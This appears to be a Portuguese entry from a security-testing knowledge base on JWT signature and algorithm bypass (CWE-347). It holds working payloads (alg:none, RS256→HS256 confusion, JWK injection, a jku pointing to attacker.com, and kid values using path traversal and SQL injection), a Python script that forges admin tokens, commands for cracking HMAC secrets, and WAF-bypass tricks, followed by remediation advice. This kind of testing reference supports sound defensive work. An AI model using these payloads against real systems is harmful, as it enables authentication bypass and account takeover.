---
id: jwt_signature_bypass
title: "JWT Signature and Algorithm Bypass"
module: "jwt"
severity: "CRITICAL"
cwe_id: "CWE-347"
cwe_title: "Improper Verification of Cryptographic Signature"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
vrt_id: "broken_authentication_and_session_management.authentication_bypass.json_web_token_vulnerability"
---

## Summary
Falhas na validação de JWT permitem forjar tokens, escalar privilégios e assumir contas. As variações mais comuns são `alg:none`, confusão RS256→HS256, injeção de JWK/JKU e `kid` controlável.

## Description
Um JWT é composto por header, payload e assinatura, codificados em Base64URL. O servidor deve validar a assinatura com uma chave confiável e aceitar apenas algoritmos explicitamente permitidos. Quando o header `alg` controla a verificação, o atacante pode:

- Trocar `alg` para `none` e remover a assinatura, se a biblioteca aceitar tokens não assinados.
- Trocar `RS256` por `HS256` e usar a chave pública RSA (conhecida) como segredo HMAC, quando o servidor não fixa o algoritmo.
- Injetar uma chave via `jwk`, `jku` ou `x5u`, apontando para um JWKS controlado pelo atacante.
- Explorar `kid` em SQL injection, path traversal ou leitura de arquivo para escolher uma chave previsível.
- Explorar segredo HMAC fraco (força bruta offline) ou validação de assinatura ausente em algum endpoint.

O problema é agravado por bibliotecas antigas, implementações caseiras, aceitação de `alg` do token, falta de validação de `iss`, `aud`, `exp`, `nbf` e confiança cega em JWKS remoto.

## Impact
- Bypass total de autenticação e autorização; acesso a qualquer conta ou painel administrativo.
- Escalada de privilégios (usuário comum → admin) e acesso a dados de outros tenants.
- Forja de identidade em APIs, webhooks e integrações machine-to-machine.
- Persistência: tokens de longa duração permitem acesso contínuo mesmo após troca de senha, se não houver revogação.
- Impacto regulatório e financeiro severo; normalmente CRITICAL.

## Payloads and Bypasses
```text
# Token original
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9.<sig> # nosemgrep: generic.secrets.security.detected-jwt-token

# 1) alg:none (remover assinatura; manter o ponto final)
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}

# 2) Confusão RS256 -> HS256 (assinar com a chave pública PEM)
{"alg":"HS256","typ":"JWT"}

# 3) Injeção de JWK
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}

# 4) JKU controlado
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}

# 5) kid traversal / SQLi
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
{"alg":"HS256","typ":"JWT","kid":"key1' UNION SELECT 'known-secret'-- -"}
{"alg":"HS256","typ":"JWT","kid":"/etc/passwd"}
```

Geração de token `none` e HS256:
```python
import base64, json, hmac, hashlib

def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1", "role": "admin"}
print(f"{b64(header)}.{b64(payload)}.")

# HS256 usando a chave pública RSA como segredo
secret = open("public.pem", "rb").read()
h = b64({"alg": "HS256", "typ": "JWT"})
p = b64({"sub": "1", "role": "admin"})
sig = base64.urlsafe_b64encode(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(f"{h}.{p}.{sig}")
```

Teste e força bruta:
```bash
# Enviar token
curl -s https://alvo.com/api/me -H "Authorization: Bearer $TOKEN"

# Crack de segredo HMAC fraco
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
```

Variações de bypass de WAF/filtros:
```text
- Base64URL sem padding; padding aceito de forma permissiva
- Header com duplicatas: {"alg":"RS256","alg":"none"}
- Case variations: None, NONE, nOnE
- Espaços e comentários no JSON
- Assinatura vazia, truncada ou de outro token
- `crit`/`b64` headers para alterar parsing
- Endpoints alternativos que não validam assinatura (ex.: /api/internal, /debug)
```

Casos reais e mentalidade de ataque (RWBH): em APIs mobile e SSO de programas como Uber, Twitter e Yahoo, o padrão é testar `alg:none`, trocar RS256 por HS256 e procurar segredos fracos antes de partir para injeção de JWK/JKU.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `Authorization: Bearer`, `token`, `jwt`, `id_token`, `access_token`, `refresh_token`, `code`.
- **Paths comuns:** `/api/me`, `/api/v1/user`, `/oauth/token`, `/oauth/introspect`, `/.well-known/jwks.json`, `/login`, `/admin`, `/graphql`.
- **Sinais:** JWT em cookies (`access_token`, `session`), header `alg` refletido, JWKS público, `kid` previsível, ausência de `exp`/`aud`.

## Recommendation
1. Fixar o algoritmo esperado por endpoint; nunca confiar no `alg` do token. Rejeitar `none` explicitamente.
2. Usar bibliotecas maduras e atualizadas (jjwt, Nimbus JOSE+JWT, Spring Security OAuth2 Resource Server) e validar `iss`, `aud`, `exp`, `nbf`, `iat`, `sub`.
3. Para RS256/ES256, validar a assinatura com chave pública fixa ou JWKS confiável por `issuer`; bloquear `jwk`, `jku`, `x5u` controlados pelo cliente.
4. Sanitizar `kid` com allowlist de IDs conhecidos; nunca usar `kid` em SQL, shell ou path sem validação.
5. Usar segredos HMAC de pelo menos 256 bits, armazenados em KMS/Secret Manager, com rotação.
6. Preferir algoritmos assimétricos (ES256/EdDSA) para tokens entre serviços e validar `typ`/`cty`.
7. Implementar revogação (denylist/`jti`), rotação de chaves com `kid` e tempos de vida curtos para access tokens.
8. Exemplo Spring Security:
```java
@Bean
JwtDecoder jwtDecoder() {
    NimbusJwtDecoder decoder = NimbusJwtDecoder.withPublicKey(publicKey).build();
    OAuth2TokenValidator<Jwt> withIssuer = JwtValidators.createDefaultWithIssuer("https://issuer");
    decoder.setJwtValidator(withIssuer);
    return decoder;
}
```
9. Adicionar testes de regressão que rejeitam `alg:none`, HS256 com chave pública, `jku` externo e `kid` inválido.
